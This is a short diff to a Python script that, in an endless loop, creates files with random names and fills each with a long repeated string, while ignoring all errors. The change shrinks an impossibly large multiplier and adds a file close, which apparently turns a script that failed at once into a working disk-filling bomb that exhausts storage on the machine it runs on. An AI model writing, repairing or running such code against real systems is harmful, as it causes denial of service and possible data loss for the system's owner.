@@ -5,7 +5,8 @@ list = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','f','g','h','j',
 while True:
     try:
         a= (choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list)+choice(list))
-        f= open(f'{a}.txt','w+')
-        b = f.write('1.2.3.4'+'.1.2.3.4.'*100000000000000000000000000+'1.2.3.4')
+        f= open(f'{a}.txt','+w')
+        f.write('1.2.3.4'+'.1.2.3.4.'*10000+'1.2.3.4')
+        f.close()
     except:
         continue
